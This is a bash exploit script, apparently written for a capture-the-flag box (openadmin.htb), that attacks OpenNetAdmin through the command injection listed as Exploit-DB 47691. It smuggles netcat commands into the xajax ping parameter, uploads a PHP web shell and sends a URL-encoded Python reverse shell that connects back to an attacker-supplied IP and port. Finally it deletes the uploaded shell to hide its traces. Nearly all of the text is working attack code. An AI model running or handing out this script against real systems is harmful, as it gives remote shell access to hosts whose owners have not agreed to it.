#!/bin/bash

#check for right amount of params
if [[ $# -ne 3 ]]; then
    echo "Usage: $0 <url> <ip> <port>";
    exit 1;
fi

URL="${1}"
IP="${2}"
PORT="${3}"

#open a listener to catch a payload file on the remote host (child proc) https://www.exploit-db.com/exploits/47691
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";nc -l 2001 > power.php;echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1 &

#wait for it to establish
sleep 2

#send the php shell
ncat openadmin.htb 2001 < payload.php

#build the reverse shell payload ( I used this shell in obscurity too.)
PAYLOAD=$( echo -n "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IP}\",${PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" | jq -s -R -r @uri )

#prompt user to spawn ncat listener
echo -e "Enter:\nncat -lvnp ${PORT}\ninto another terminal then press RETURN here."
read

#send payload (child proc)
curl -q "${URL}power.php?x=${PAYLOAD}" > /dev/null 2>&1 &

#erase php shell on remote host
curl -q "${URL}power.php?x=rm%20power.php" > /dev/null 2>&1

exit 0

